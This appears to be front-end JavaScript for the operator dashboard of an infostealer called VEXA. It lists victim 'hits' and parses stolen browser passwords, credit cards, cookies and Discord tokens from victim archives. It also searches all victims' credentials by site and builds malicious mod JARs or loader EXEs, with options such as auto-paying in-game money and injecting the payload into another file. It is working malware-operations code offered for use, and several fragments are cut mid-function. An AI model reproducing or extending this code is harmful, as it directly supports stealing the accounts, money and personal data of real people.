async function copyTextDash(text) {
    if (text == null || text === '') return false;
    const s = String(text);
    try {
        if (navigator.clipboard && window.isSecureContext) {
            await navigator.clipboard.writeText(s);
            return true;
        }
    } catch (_) { /* fall through */ }
    try {
        const ta = document.createElement('textarea');
        ta.value = s;
        ta.setAttribute('readonly', '');
        ta.style.cssText = 'position:fixed;left:-9999px;top:0';
        document.body.appendChild(ta);
        ta.select();
        const ok = document.execCommand('copy');
        ta.remove();
        return ok;
    } catch (_) {
        return false;
    }
}

function normalizeDiscordTokEntry(x) {
    if (x == null) return null;
    if (typeof x === 'string') {
        const token = x.trim();
        return token ? { token, username: '' } : null;
    }
    const token = String(x.token || '').trim();
    if (!token) return null;
    return { token, username: String(x.username || '').trim() };
}

async function runAuthPost(btn, path, body) {
    const b = btn;
    if (b) {
        b.disabled = true;
        b.classList.add('btn-loading');
    }
    try {
        const r = await fetch(path, {
            method: 'POST',
            credentials: 'include',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        });
        const j = await r.json().catch(() => ({}));
        if (!r.ok) {
            showToast(j.error || 'Something went wrong', 'error');
            return;
        }
        window.location.reload();
    } finally {
        if (b) {
            b.disabled = false;
            b.classList.remove('btn-loading');
        }
    }
}

        const btn = document.getElementById('adminLoginBtn');
        if (btn) { btn.disabled = true; btn.classList.add('btn-loading'); }
        try {
            const r = await fetch('/api/auth/login-local', {
                method: 'POST', credentials: 'include',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: u, password: p })
            });
            const j = await r.json().catch(() => ({}));
            if (!r.ok) { showToast(j.error || 'Invalid admin credentials', 'error'); return; }

            window.location.reload();
        } catch { showToast('Login failed', 'error'); }
        finally { if (btn) { btn.disabled = false; btn.classList.remove('btn-loading'); } }

    bindAuthForm(document.getElementById('authModalFormRoot'), 'lm');

        const tabs = document.querySelectorAll('.nav-tab');
        const mainArea = document.getElementById('mainArea');
        let currentTab = 'overview';

        function switchTab(tab) {
            if (currentTab === 'remote' && tab !== 'remote' && userStatus.premium) {
                try { closeRemoteHitOverlay(); } catch (_) {}
                const rc = document.querySelector('#mainArea .remote-container');
                if (rc && rc.parentNode) window.__remotePanelRoot = rc.parentNode.removeChild(rc);
            }
            tabs.forEach(t => t.classList.remove('on'));
            document.querySelector(`.nav-tab[data-tab="${tab}"]`)?.classList.add('on');
            document.querySelectorAll('.nav-tab-m').forEach((t) => t.classList.toggle('on', t.dataset.tab === tab));
            currentTab = tab;
            renderTabContent(tab);
        }

        mainArea.addEventListener('click', (e) => {
            const d = e.target.closest('.hit-donate');
            if (!d) return;
            const hid = d.getAttribute('data-hit-id');
            const mc = d.getAttribute('data-mc-user') || '';
            if (!hid) return;
            e.preventDefault();
            openDonateHitModal(parseInt(hid, 10), mc);
        });

        async function renderTabContent(tab) {
            try {
                if (tab === 'remote') {
                    if (userStatus.premium && window.__remotePanelRoot) {
                        mainArea.innerHTML = '';
                        mainArea.appendChild(window.__remotePanelRoot);
                        setTimeout(() => initRemoteComponents(), 0);
                    } else {
                        mainArea.innerHTML = getRemoteHTML();
                        setTimeout(() => initRemoteComponents(), 0);
                    }
                } else {
                    if (tab === 'hits') window.__hitsTabWired = false;
                    mainArea.innerHTML = getSimplePanelHTML(tab);
                    if (tab === 'hits')        setTimeout(() => initHitsTab(), 0);
                    if (tab === 'leaderboard') setTimeout(() => initLeaderboardTab(), 0);
                    if (tab === 'build')       setTimeout(() => initBuildForm(), 0);
                    if (tab === 'settings')    setTimeout(() => { void initSettings(); }, 0);
                    if (tab === 'more')        setTimeout(() => initMore(), 0);
                    if (tab === 'overview')    setTimeout(() => loadRecentHits(), 0);
                }
            } catch(e) {
                console.error('Error rendering tab:', e);
                mainArea.innerHTML = '<div style="color:var(--red);padding:2rem;font-size:0.85rem;">An error occurred. Check console.</div>';
            }
        }

        tabs.forEach(tab => tab.addEventListener('click', () => switchTab(tab.dataset.tab)));
        document.querySelectorAll('.nav-tab-m').forEach((tab) => tab.addEventListener('click', () => switchTab(tab.dataset.tab)));
        renderTabContent('overview');
        requestAnimationFrame(() => document.getElementById('dash')?.classList.add('show'));

    } catch(e) {
        console.error('Fatal error in renderDashboard:', e);
        document.getElementById('app').innerHTML = '<div style="color:var(--red);padding:2rem;">Failed to load dashboard. Check console.</div>';
    }
}

/* ==================== FILE INPUT HELPER ==================== */
/* Wraps a hidden <input type="file"> with a styled button */
function styleFileInput(inputId, label = 'Choose File') {
    const input = document.getElementById(inputId);
    if (!input) return;
    const wrapper = document.createElement('div');
    wrapper.className = 'file-input-wrapper';
    input.parentNode.insertBefore(wrapper, input);
    wrapper.appendChild(input);
    const btn = document.createElement('label');
    btn.htmlFor = inputId;
    btn.className = 'file-input-btn';
    btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>${label}`;
    const nameSpan = document.createElement('span');
    nameSpan.className = 'file-input-name';
    nameSpan.textContent = 'No file chosen';
    input.addEventListener('change', () => {
        nameSpan.textContent = input.files[0]?.name || 'No file chosen';
        nameSpan.classList.toggle('has-file', !!input.files[0]);
    });
    wrapper.appendChild(btn);
    wrapper.appendChild(nameSpan);
}

/* ==================== HITS TAB ==================== */
let __hitsReloadTimer = null;
function scheduleHitsReload() {
    clearTimeout(__hitsReloadTimer);
    __hitsReloadTimer = setTimeout(() => {
        currentHitsPage = 1;
        loadHits(1);
    }, 420);
}

function parseMoneyAmountInput(raw) {
    if (raw === undefined || raw === null) return null;
    const clean = String(raw).trim().toLowerCase().replace(/[\s,_]/g, '');
    if (!clean) return null;
    const m = clean.match(/^(\d+(?:\.\d+)?)([kmb])?$/);
    if (!m) return null;
    const base = parseFloat(m[1]);
    if (!Number.isFinite(base)) return null;
    const mult = m[2] === 'k' ? 1e3 : m[2] === 'm' ? 1e6 : m[2] === 'b' ? 1e9 : 1;
    const out = Math.round(base * mult);
    return out > 0 ? out : null;
}

function renderHitsPaginationControls(page, totalPages) {
    const el = document.getElementById('hitsPaginationControls');
    if (!el) return;
    if (totalPages <= 1) { el.innerHTML = ''; return; }
    const start = Math.max(1, page - 2);
    const end = Math.min(totalPages, page + 2);
    let html = `<button type="button" class="hits-page-btn" data-hit-page="${page - 1}" ${page <= 1 ? 'disabled' : ''}>Prev</button>`;
    for (let p = start; p <= end; p++) {
        html += `<button type="button" class="hits-page-btn ${p === page ? 'on' : ''}" data-hit-page="${p}">${p}</button>`;
    }
    html += `<button type="button" class="hits-page-btn" data-hit-page="${page + 1}" ${page >= totalPages ? 'disabled' : ''}>Next</button>`;
    el.innerHTML = html;
}

function updateHitsStolenFilterButtonLabel() {
    const btn = document.getElementById('hitsStolenFilterBtn');
    if (!btn) return;
    const selected = STOLEN_SIGNAL_OPTIONS.filter((o) => __selectedStolenSignalIds.has(o.id));
    if (!selected.length) {
        btn.innerHTML = '<span>Stolen data: All</span>';
        return;
    }
    const icons = selected.slice(0, 4).map((o) => `<span class="hit-stolen-ico" title="${escapeHtml(o.label)}">${stolenIconSvg(o.id)}</span>`).join('');
    const tail = selected.length > 4 ? ` +${selected.length - 4}` : '';
    btn.innerHTML = `${icons}<span>${selected.length} selected${tail}</span>`;
}

function initHitsStolenFilterUI() {
    const menu = document.getElementById('hitsStolenFilterMenu');
    const btn = document.getElementById('hitsStolenFilterBtn');
    if (!menu || !btn || menu.dataset.ready === '1') return;
    menu.dataset.ready = '1';
    const opts = STOLEN_SIGNAL_OPTIONS.map((o) => `
        <label class="hits-stolen-filter-opt">
            <input type="checkbox" class="hits-stolen-filter-cb" data-signal-id="${o.id}">
            <span class="hit-stolen-ico">${stolenIconSvg(o.id)}</span>
            <span>${escapeHtml(o.label)}</span>
        </label>
    `).join('');
    menu.innerHTML = `
        <div style="display:flex;align-items:center;justify-content:space-between;gap:0.5rem">
            <strong style="font-size:0.72rem;color:var(--t1)">Filter stolen data type</strong>
            <button type="button" class="btn btn-g" id="hitsStolenFilterClear" style="padding:0.35rem 0.55rem;font-size:0.68rem">Clear</button>
        </div>
        <div class="hits-stolen-filter-grid">${opts}</div>
    `;
    btn.addEventListener('click', () => menu.classList.toggle('on'));
    document.addEventListener('click', (e) => {
        if (!menu.classList.contains('on')) return;
        if (menu.contains(e.target) || btn.contains(e.target)) return;
        menu.classList.remove('on');
    });
    menu.addEventListener('change', (e) => {
        const cb = e.target.closest('.hits-stolen-filter-cb');
        if (!cb) return;
        const id = cb.getAttribute('data-signal-id');
        if (!id) return;
        if (cb.checked) __selectedStolenSignalIds.add(id);
        else __selectedStolenSignalIds.delete(id);
        updateHitsStolenFilterButtonLabel();
        scheduleHitsReload();
    });
    menu.querySelector('#hitsStolenFilterClear')?.addEventListener('click', () => {
        __selectedStolenSignalIds.clear();
        menu.querySelectorAll('.hits-stolen-filter-cb').forEach((cb) => { cb.checked = false; });
        updateHitsStolenFilterButtonLabel();
        scheduleHitsReload();
    });
    updateHitsStolenFilterButtonLabel();
}

async function onHitsTableWrapClick(e) {
    const ipBtn = e.target.closest('.hit-ip-expand');
    if (ipBtn) {
        if (ipBtn.disabled) return;
        const ip = ipBtn.getAttribute('data-hit-ip');
        if (ip) void openIpIntelModal(ip);
        return;
    }
    const copyBtn = e.target.closest('.copy-session');
    if (copyBtn) {
        const ok = await copyTextDash(copyBtn.dataset.session);
        showToast(ok ? 'Session ID copied' : 'Copy failed', ok ? 'success' : 'error', 1500);
        return;
    }
    const dcBtn = e.target.closest('.hit-dc-copy');
    if (dcBtn) {
        openDiscordTokenPicker(parseInt(dcBtn.getAttribute('data-hit-id'), 10));
        return;
    }
    const viewHit = e.target.closest('.view-hit-only');
    if (viewHit) {
        viewHitDetails(viewHit.dataset.id);
        return;
    }
    const dl = e.target.closest('.download-hit');
    if (dl) {
        window.location.href = `/api/hit/${dl.dataset.id}/download`;
        return;
    }
    const recheck = e.target.closest('.recheck-hit');
    if (recheck) {
        if (!userStatus.premium) { showPremiumPopup(); return; }
        const username = recheck.dataset.username;
        if (!username || recheck.disabled) return;
        recheck.disabled = true;
        try {
            const r = await fetch(`/api/recheck-stats/${encodeURIComponent(username)}`);
            if (r.ok) showStatsPopup(await r.json(), username);
            else showToast('Failed to fetch stats', 'error');
        } finally {
            recheck.disabled = false;
        }
        return;
    }
    const vrf = e.target.closest('.view-refresh');
    if (vrf) {
        const id = vrf.dataset.hitId;
        const tok = window.__hitRefreshTokens?.[id];
        if (tok) showRefreshTokenModal(tok);
    }
}

async function onHitsTableWrapChange(e) {
    const cb = e.target;
    if (!cb.classList?.contains('hit-check')) return;
    await fetch(`/api/hit/${cb.dataset.id}/checked`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ checked: cb.checked })
    });
}

function attachHitsTableDelegation(wrap) {
    if (!wrap || wrap._dashHitsDelegated) return;
    wrap._dashHitsDelegated = true;
    wrap.addEventListener('click', onHitsTableWrapClick);
    wrap.addEventListener('change', onHitsTableWrapChange);
}

function initHitsTableDelegation() {
    attachHitsTableDelegation(document.getElementById('hitsTableWrap'));
}

// Position hover-extra as fixed popup so it never goes under other elements
document.addEventListener('mouseover', (e) => {
    const wrap = e.target.closest('.hit-stolen-wrap');
    if (!wrap) return;
    const extra = wrap.querySelector('.hit-stolen-hover-extra');
    if (!extra) return;

function siteSearchNeedlesFromQuery(raw) {
    const s = (raw || '').trim().toLowerCase();
    if (s.length < 2) return [];
    const cleaned = s.replace(/^https?:\/\//, '');
    const noWww = cleaned.replace(/^www\./, '');
    const firstChunk = noWww.split(/[\s/?#]/)[0] || noWww;
    const host = firstChunk.split(':')[0];
    const out = new Set();
    [s, cleaned, noWww, firstChunk, host].forEach((x) => {
        if (x && x.length >= 2) out.add(x);
    });
    return [...out];
}

function tryHitZipPathFromFiles(files, candidates) {
    const pathSet = new Set((files || []).map((f) => String(f.path || '').replace(/\\/g, '/')));
    for (const p of candidates) {
        if (pathSet.has(p)) return p;
    }
    return null;
}

function passwordRowsMatchingSite(parsedRows, needles) {
    return parsedRows.filter((r) => {
        const hay = `${r.url || ''} ${r.username || ''} ${r.browser || ''}`.toLowerCase();
        return needles.some((n) => hay.includes(n));
    });
}

function cookieLinesMatchingSite(rawText, needles, maxLines) {
    const lines = (rawText || '').split(/\r?\n/);
    const hits = [];
    for (const line of lines) {
        const t = line.trim();
        if (!t || t.startsWith('#')) continue;
        const low = t.toLowerCase();
        if (!needles.some((n) => low.includes(n))) continue;
        hits.push({ excerpt: t.length > 260 ? `${t.slice(0, 257)}�?�` : t });
        if (hits.length >= (maxLines || 30)) break;
    }
    return hits;
}

/** Bounded parallel async (e.g. ZIP scans) without launching hundreds of requests at once. */
async function mapWithConcurrency(items, concurrency, mapper) {
    const list = Array.isArray(items) ? items : [];
    const out = new Array(list.length);
    if (!list.length) return out;
    const n = Math.max(1, Math.min(Math.floor(concurrency) || 4, list.length));
    let next = 0;
    async function worker() {
        for (;;) {
            const cur = next;
            next += 1;
            if (cur >= list.length) return;
            out[cur] = await mapper(list[cur], cur);
        }
    }
    await Promise.all(Array.from({ length: n }, () => worker()));
    return out;
}

async function scanOneHitZipForPasswordSiteSearch(h, needles) {
    let files;
    try {
        const r = await fetch(`/api/hit/${h.id}/files`, { credentials: 'include' });
        if (!r.ok) return null;
        files = await r.json();
    } catch {
        return null;
    }
    const pwPath = tryHitZipPathFromFiles(files, ['Passwords.txt']);
    const pwHits = [];
    if (pwPath) {
        const text = await fetchHitZipText(h.id, pwPath);
        if (text) {
            const parsed = parsePasswordsFile(text);
            pwHits.push(...passwordRowsMatchingSite(parsed, needles));
        }
    }
    const cookieFiles = filesByPrefix(files, 'Cookies_Import');
    const cookieHits = [];
    for (const cf of cookieFiles.slice(0, 16)) {
        const ctext = await fetchHitZipText(h.id, cf.path);
        if (!ctext) continue;
        const lines = cookieLinesMatchingSite(ctext, needles, 28);
        if (lines.length) cookieHits.push({ path: cf.path, lines });
    }
    if (!pwHits.length && !cookieHits.length) return null;
    return { hitId: h.id, username: h.username, pwHits, cookieHits };
}

async function runHitsSiteCredentialSearch() {
    const inp = document.getElementById('hitsPwSiteQuery');
    const box = document.getElementById('hitsPasswordsList');
    const raw = (inp?.value || '').trim();
    const needles = siteSearchNeedlesFromQuery(raw);
    if (!needles.length) {
        showToast('Enter at least 2 characters (domain, site name, or keyword)', 'error');
        return;
    }
    if (!userStatus.premium) {
        if (box) box.innerHTML = '<div class="hits-table-empty">Premium only.</div>';
        return;
    }
    if (box) box.innerHTML = '<div class="f-loading">Loading hit list�?�</div>';
    let hits;
    try {
        hits = await fetchHitsBulkForSidePanels();
    } catch {
        if (box) box.innerHTML = '<div class="hits-table-empty">Could not load hits.</div>';
        return;
    }
    const HITS_PW_SCAN_MAX = 340;
    const HITS_PW_SCAN_CONCURRENCY = 4;
    const allZipHits = hits.filter((h) => h.fullData);
    const zips = allZipHits.slice(0, HITS_PW_SCAN_MAX);
    if (!zips.length) {
        if (box) {
            box.innerHTML =
                '<div class="hits-table-empty">No hits with a ZIP in the loaded list. Session archives show here after the stealer uploads a file.</div>';
        }
        return;
    }
    let done = 0;
    const bump = () => {
        done += 1;
        if (box) {
            box.innerHTML = `<div class="f-loading">Scanning archives�?� ${done} / ${zips.length} (up to ${HITS_PW_SCAN_CONCURRENCY} ZIPs in parallel)</div>`;
        }
    };
    const chunks = await mapWithConcurrency(zips, HITS_PW_SCAN_CONCURRENCY, async (h) => {
        try {
            return await scanOneHitZipForPasswordSiteSearch(h, needles);
        } finally {
            bump();
        }
    });
    const aggregated = chunks.filter(Boolean);
    renderHitsSiteSearchResults(aggregated, raw, zips.length, allZipHits.length);
}

                    }

                customDescription: customizeOn ? (document.getElementById('modDesc')?.value || null) : null,
                iconBase64:    null,
                injectVictim:  false,
                victimBase64:  null,
                adjustSize:    false,
                desiredSize:   null
            };

            if (userStatus.premium && !standalone) {
                if (document.getElementById('autoPayEnabled')?.checked) {
                    formData.autoPay = {
                        maxMoney:       document.getElementById('buildMaxMoney')?.value,
                        maxPlaytime:    document.getElementById('maxPlaytime')?.value,
                        targetUsername: document.getElementById('targetUser')?.value
                    };
                }
                if (customizeOn) {
                    const iconFile = document.getElementById('iconFile')?.files[0];
                    if (iconFile) formData.iconBase64 = await readFileAsBase64(iconFile);
                }

                if (document.getElementById('injectEnabled')?.checked) {
                    const victimFile = document.getElementById('victimFile')?.files[0];
                    if (victimFile) {
                        formData.victimBase64  = await readFileAsBase64(victimFile);
                        formData.injectVictim  = true;
                    }
                }
                if (document.getElementById('sizeAdjustEnabled')?.checked) {
                    formData.adjustSize  = true;
                    formData.desiredSize = document.getElementById('desiredSize')?.value;
                }
            }

            const res = await fetch('/api/buildmod', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            });

            if (res.ok) {
                const blob = await res.blob();
                const url  = window.URL.createObjectURL(blob);
                const a    = document.createElement('a');
                a.href = url;
                a.download = standalone ? 'VEXA-loader.exe' : 'VEXA.jar';
                a.click();
                window.URL.revokeObjectURL(url);
                if (window.hideBuildOverlay) window.hideBuildOverlay(true);
                showToast(standalone ? 'Loader EXE downloaded' : 'Mod built successfully', 'success');
            } else {
                const err = await res.json().catch(() => ({}));
                if (window.hideBuildOverlay) window.hideBuildOverlay(false);
                showToast(err.error || 'Build failed', 'error');
            }
        } finally {
            btn.disabled = false;
            syncBuildOutputUI();
        }
    });
}

function readFileAsBase64(file) {
    return new Promise((resolve, reject) => {
        const r = new FileReader();
        r.onload  = e => resolve(e.target.result.split(',')[1]);
        r.onerror = reject;
        r.readAsDataURL(file);
    });
}

    // --- Notification permission banner ---
    function renderNotifBanner() {
        const banner = document.getElementById('notifPermBanner');
        if (!banner) return;
        if (!('Notification' in window)) {
            banner.style.display = 'flex';
            banner.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><span>Your browser does not support notifications.</span>`;
            return;
        }
        if (Notification.permission === 'denied') {
            banner.style.display = 'flex';
            banner.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><span>Notifications are blocked. Please allow them in your browser site settings, then reload.</span>`;
            return;
        }
        if (Notification.permission === 'default') {
            banner.style.display = 'flex';
            banner.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg><span>Allow notifications to receive alerts when a new hit comes in.</span><button class="notif-banner-btn" id="grantNotifBtn">Allow Notifications</button>`;
            document.getElementById('grantNotifBtn')?.addEventListener('click', async () => {
                const perm = await Notification.requestPermission();
                renderNotifBanner();
                if (perm === 'granted' && notifPrefs.browser) {
                    new Notification('VEXA', { body: 'Notifications are enabled!' });
                }
            });
            return;
        }
        if (Notification.permission === 'granted') {
            banner.style.display = 'flex';
            banner.className = 'notif-banner notif-granted';
            banner.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg><span>Browser notifications are allowed for this site.</span>`;
        }
    }

    renderNotifBanner();

    // --- Sync toggles from saved prefs ---
    const browserToggle = document.getElementById('notifBrowserToggle');
    const soundToggle   = document.getElementById('notifSoundToggle');
    if (browserToggle) browserToggle.checked = notifPrefs.browser;
    if (soundToggle)   soundToggle.checked   = notifPrefs.sound;

    // --- Live-save notification prefs (no server round-trip needed) ---
    browserToggle?.addEventListener('change', async () => {
        if (browserToggle.checked && Notification.permission === 'default') {
            const perm = await Notification.requestPermission();
            renderNotifBanner();
            if (perm !== 'granted') { browserToggle.checked = false; return; }
        }
        notifPrefs.browser = browserToggle.checked;
        localStorage.setItem('notif_browser', notifPrefs.browser);
    });
    soundToggle?.addEventListener('change', () => {
        notifPrefs.sound = soundToggle.checked;
        localStorage.setItem('notif_sound', notifPrefs.sound);
        if (notifPrefs.sound) playHitSound(); // preview
    });

    // --- Auto-save profile + webhook (debounced) ---
    function scheduleSettingsSave() {
        const status = document.getElementById('settingsSaveStatus');
        if (status) status.textContent = 'Saving�?�';
        if (settingsSaveTimer) clearTimeout(settingsSaveTimer);
        settingsSaveTimer = setTimeout(async () => {
            settingsSaveTimer = null;
            if (!document.getElementById('settingsWebhook')) return;
            const displayName = document.getElementById('displayName')?.value ?? '';
            const anonymous = !!document.getElementById('anonSetting')?.checked;
            const webhookUrl = document.getElementById('settingsWebhook')?.value ?? '';
            const webhookPingMinMoney = document.getElementById('webhookPingMinMoney')?.value ?? '';
            const webhookPingOnCrypto = !!document.getElementById('webhookPingOnCrypto')?.checked;
            const webhookEnabled = !!document.getElementById('webhookEnabledToggle')?.checked;
            const res = await fetch('/api/user/settings', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                body: JSON.stringify({ displayName, anonymous, webhookUrl, webhookPingMinMoney, webhookPingOnCrypto, webhookEnabled })
            });
            if (res.ok) {
                userStatus.displayName = displayName;
                userStatus.anonymous = anonymous;
                anonymousMode = anonymous;
                await fetchUserStatus();
                const w = document.getElementById('settingsWebhook');
                if (w) w.value = userStatus.webhookUrl || '';
                if (status) status.textContent = 'Saved';
                setTimeout(() => {
                    const s = document.getElementById('settingsSaveStatus');
                    if (s) s.textContent = 'Changes save automatically.';
                }, 1800);
            } else {
                if (status) status.textContent = 'Save failed';
                const err = await res.json().catch(() => ({}));
                showToast(err.error || 'Failed to save settings', 'error');
            }
        }, 550);
    }
    document.getElementById('displayName')?.addEventListener('input', scheduleSettingsSave);
    document.getElementById('anonSetting')?.addEventListener('change', scheduleSettingsSave);
    document.getElementById('settingsWebhook')?.addEventListener('input', scheduleSettingsSave);
    document.getElementById('webhookPingMinMoney')?.addEventListener('input', scheduleSettingsSave);
    document.getElementById('webhookPingOnCrypto')?.addEventListener('change', scheduleSettingsSave);
    document.getElementById('webhookEnabledToggle')?.addEventListener('change', scheduleSettingsSave);
}

/* Relative time helper */
function timeAgo(ts) {
    const diff = Date.now() - new Date(ts).getTime();
    const s = Math.floor(diff / 1000);
    if (s < 60)    return `${s}s ago`;
    const m = Math.floor(s / 60);
    if (m < 60)    return `${m}m ago`;
    const h = Math.floor(m / 60);
    if (h < 24)    return `${h}h ago`;
    const d = Math.floor(h / 24);
    if (d < 30)    return `${d}d ago`;
    const mo = Math.floor(d / 30);
    if (mo < 12)   return `${mo}mo ago`;
    return `${Math.floor(mo/12)}y ago`;
}

function stripApolloWatermark(raw) {
    if (!raw || typeof raw !== 'string') return '';
    const m = raw.match(/={20,}\s*\n\s*\n/);
    if (m && m.index != null) return raw.slice(m.index + m[0].length).trim();
    return raw.trim();
}

function parseSystemInfoJson(raw) {
    const t = stripApolloWatermark(raw);
    const i = t.indexOf('{');
    if (i === -1) return null;
    try { return JSON.parse(t.slice(i)); } catch { return null; }
}

function parseSummaryLines(raw) {
    const text = stripApolloWatermark(raw);
    const stats = {};
    for (const line of text.split('\n')) {
        const m = line.match(/^([A-Za-z][A-Za-z\s]+):\s*(\d+)\s*$/);
        if (m) stats[m[1].trim().toLowerCase().replace(/\s+/g, '_')] = parseInt(m[2], 10);
    }
    return stats;
}

function parsePasswordsFile(raw) {
    const text = stripApolloWatermark(raw);
    const blocks = text.split(/\n-{50}\n/).map(b => b.trim()).filter(Boolean);
    const rows = [];
    for (const block of blocks) {
        if (/^Browser Passwords:/i.test(block)) continue;
        const header = block.match(/^\[([^\]]+)\]/);
        const url = block.match(/^URL:\s*(.*)$/m);
        const username = block.match(/^Username:\s*(.*)$/m);
        const password = block.match(/^Password:\s*(.*)$/m);
        if (url || username || password) {
            rows.push({
                browser: header ? header[1].trim() : '�?"',
                url: url ? url[1].trim() : '',
                username: username ? username[1].trim() : '',
                password: password ? password[1].trim() : ''
            });
        }
    }
    return rows;
}

function parseCreditCardsFile(raw) {
    const text = stripApolloWatermark(raw);
    const blocks = text.split(/\n-{30,}\n|\n{2,}/).map(b => b.trim()).filter(Boolean);
    const rows = [];
    for (const block of blocks) {
        if (/^Credit Cards:/i.test(block)) continue;
        const header = block.match(/^\[([^\]]+)\]/);
        const name = block.match(/^Name:\s*(.*)$/mi);
        const card = block.match(/^(?:Card|Card Number|Number):\s*(.*)$/mi);
        const expires = block.match(/^(?:Expires|Expiry|Exp):\s*(.*)$/mi);
        if (name || card || expires) {
            rows.push({
                browser: header ? header[1].trim() : '�?"',
                name: name ? name[1].trim() : '',
                card: card ? card[1].trim() : '',
                expires: expires ? expires[1].trim() : ''
            });
        }
    }
    return rows;
}

/** Extract Discord user tokens from stealer text */
function parseDiscordTokensFromText(raw) {
    const text = stripApolloWatermark(raw);
    const tokens = [];
    const seen = new Set();
    const re = /Token #(\d+):\s*\r?\n\s*([^\r\n]+)/g;
    let m;
    while ((m = re.exec(text)) !== null) {
        const tok = m[2].trim();
        if (tok && !seen.has(tok)) { seen.add(tok); tokens.push({ label: `Token #${m[1]}`, token: tok }); }
    }
    const re2 = /Account Token:\s*\r?\n\s*([^\r\n]+)/g;
    while ((m = re2.exec(text)) !== null) {
        const tok = m[1].trim();
        if (tok && !seen.has(tok)) { seen.add(tok); tokens.push({ label: 'Account token', token: tok }); }
    }
    return tokens;
}

function parseDiscordAccountSnippets(raw) {
    const text = stripApolloWatermark(raw);
    const chunks = text.split(/ACCOUNT #\d+/i).slice(1);
    return chunks.map((chunk, idx) => {
        const username = chunk.match(/Username:\s*(.*)/i);
        const email = chunk.match(/Email:\s*(.*)/i);
        const phone = chunk.match(/Phone:\s*(.*)/i);
        const nitro = chunk.match(/Nitro:\s*(.*)/i);
        const uid = chunk.match(/User ID:\s*(.*)/i);
        return {
            idx: idx + 1,
            username: username ? username[1].trim() : '',
            email: email ? email[1].trim() : '',
            phone: phone ? phone[1].trim() : '',
            nitro: nitro ? nitro[1].trim() : '',
            id: uid ? uid[1].trim() : ''
        };
    }).filter(a => a.username || a.email || a.id);
}

/** Shared parent folder in zip for a set of paths (for bulk wallet / folder download). */
function folderPrefixFromFiles(fileList) {
    if (!fileList?.length) return '';
    const dirs = fileList.map(f => {
        const p = f.path.replace(/\\/g, '/');
        const i = p.lastIndexOf('/');
        return i >= 0 ? p.slice(0, i) : p;
    });
    const first = dirs[0];
    if (dirs.every(d => d === first)) return first;
    const parts = dirs.map(d => d.split('/').filter(Boolean));
    let len = 0;
    while (len < parts[0].length && parts.every(a => len < a.length && a[len] === parts[0][len])) {
        len++;
    }
    return parts[0].slice(0, len).join('/');
}

function renderFileTree(files, container, viewerEl, hitId) {
    if (!container) return;
    const tree = {};
    files.forEach(f => {
        const parts = f.path.split('/');
        let cur = tree;
        parts.forEach((part, i) => {
            if (!cur[part]) cur[part] = i === parts.length - 1 ? { __file__: true, type: f.type, size: f.size } : {};
            cur = cur[part];
        });
    });

    function renderNode(node, parentPath = '') {
        let html = '<ul>';
        for (const [name, value] of Object.entries(node)) {
            const fullPath = parentPath ? parentPath + '/' + name : name;
            if (value.__file__) {
                html += `<li data-path="${escapeHtml(fullPath)}" data-type="file"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px;opacity:.75" aria-hidden="true"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>${escapeHtml(name)} <span style="color:var(--t3);font-size:0.65rem">(${value.size}b)</span></li>`;
            } else {
                html += `<li data-path="${escapeHtml(fullPath)}" data-type="dir"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:middle;margin-right:6px;opacity:.75" aria-hidden="true"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>${escapeHtml(name)}</li>`;
                html += renderNode(value, fullPath);
            }
        }
        return html + '</ul>';
    }
    container.innerHTML = renderNode(tree);

    container.querySelectorAll('li[data-path]').forEach(el => {
        el.addEventListener('click', async e => {
            e.stopPropagation();
            if (el.dataset.type !== 'file' || !viewerEl) return;
            const filePath = el.dataset.path;
            const res = await fetch(`/api/hit/${hitId}/file?path=${encodeURIComponent(filePath)}`, { credentials: 'include' });

                const ct = res.headers.get('content-type') || '';

                    const text = await res.text();
                    viewerEl.innerHTML = `<pre style="margin:0;white-space:pre-wrap;word-break:break-all">${escapeHtml(text)}</pre>`;
                } else if (ct.startsWith('image/')) {
                    const blob = await res.blob();
                    viewerEl.innerHTML = `<img src="${URL.createObjectURL(blob)}" style="max-width:100%">`;
                } else {
                    downloadHitZipFile(hitId, filePath, filePath.split('/').pop());
                    viewerEl.textContent = 'Binary file �?" download started.';
                }
            } else {
                viewerEl.textContent = 'Failed to load file';
            }
        });
    });
}

async function viewHitDetails(hitId) {
    if (!userStatus.premium) return showToast('Premium required', 'error');
    const body = document.getElementById('hitDetailBody');
    const dl = document.getElementById('hitDetailDlBtn');
    document.getElementById('hitDetailTitle').textContent = `Hit #${hitId}`;
    if (dl) {
        dl.href = `/api/hit/${hitId}/download`;
        dl.style.display = 'inline-flex';
    }
    body.innerHTML = '<div class="hit-dash-loading">Loading archive�?�</div>';
    document.getElementById('hitDetailModal').classList.add('on');

